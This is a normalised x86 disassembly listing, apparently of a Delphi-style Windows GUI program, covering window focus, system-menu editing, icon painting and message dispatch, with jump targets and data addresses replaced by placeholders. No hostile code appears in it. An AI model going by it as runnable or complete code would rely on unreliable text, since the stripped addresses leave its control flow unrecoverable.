mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_45c380
mov dx 0xb000
call sub_46ca04
test al al
jne r-xdata
call sub_45c380
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_46ca04
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470c5f
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403a64
jmp r-xdata
call sub_403a64
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_458e24
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_45c380
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_46ca04
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_456c00
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
call sub_403a64
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_45c380
mov dx 0xb01a
call sub_46ca04
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_403a64
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_456c00
sub_470c7c
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_456c00
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_45c380
push eax
call SetFocus
mov eax ebx
call sub_45c380
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_470ccc
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_456c00
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_470d80
mov eax esi
call sub_470c7c
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_45c7a8
mov edx eax
mov eax esi
call sub_4708c4
sub_470d30
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_46f948
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_456c00
mov eax ebx
call sub_46f948
mov edx esi
call sub_470d30
sub_470d80
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_469ce8
mov edx esi
call sub_469ccc
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_470e28
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_45c380
push eax
call SendMessageA
sub_470e74
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_470e28
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_470ea4
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_470e28
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_470f10
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_42538c
xor eax eax
push ebp
push sub_470fbe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_4257b8
xor eax eax
push ebp
push sub_470f9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_4033e8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470fa2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_4257b8
retn
sub_470fcc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_46f948
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_46f97c
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_4033e8
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_45b610
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_46f9c8
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_4033e8
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_47106c
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_45c380
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_45c380
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_470ef4
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_45c380
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_45a4d8
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_4710ea
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_424fa8
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_47114c
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_45c380
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_45a79c
pop edi
pop esi
retn
sub_471198
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_45c380
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_471294
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_46fcbc
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_471198
pop ecx
sub_4712c8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_45711c
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_45c380
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_45c380
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_45c380
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_4560f4
pop esi
pop ebx
retn
sub_471358
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_45c380
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_45b59c
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_45c380
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_469708
sub_4713b8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_45a638
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_46911c
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_471404
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_46997c
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_47143c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_4714d7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4714de
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_46907c
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4761f8
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_452b5c
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4761f8
jmp r-xdata
sub_471504
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_4033e8
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_471544
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40d088
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_471570
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_470d30
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_452934
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_4715c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_45b480
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_474bac
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_4033e8
sub_471654
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_45c380
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_45c380
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_45c380
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4716ec
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_45c380
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_470ccc
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_4033e8
sub_471744
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_45c8b4
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_471770
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_470d30
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_47178c
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_4690ac
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_4690ac
sub_4717cc
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_471804
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_403fd0
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_471838
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_471989
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471990
lea eax [ ebp - 0x10 ]
call sub_403f7c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_47178c
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_4528d8
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_417744
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_455564
lea eax [ ebp - 0x1c ]
call sub_406cb0
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_47178c
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_4717cc
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_475e9c
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_475f04
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_475f04
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_471804
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_417744
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_455564
lea eax [ ebp - 0x1c ]
call sub_406cb0
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_475e34
test [ esi + 0x228 ] 0x8
je r-xdata
sub_471998
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_471a0c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_471a38
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45a8e4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46fa48
lea edx [ ebp - 0x14 ]
call sub_473210
push ebp
mov eax [ ebp - 0x4 ]
call sub_46fa48
lea edx [ ebp - 0x24 ]
call sub_473210
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_471a0c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_46fa48
lea edx [ ebp - 0x24 ]
call sub_473210
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_471a0c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_471a0c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_471a0c
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_471af0
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_4033e8
pop esi
pop ebx
retn
sub_471b14
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_4033e8
pop esi
pop ebx
retn
sub_471b38
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_45b7c4
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_45c8b4
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_45c8b4
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_471bd4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47213e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_4762e8
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_472121
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472128
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
xor eax eax
push ebp
push sub_472028
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_4033e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_471c8c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_4033e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_470d80
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
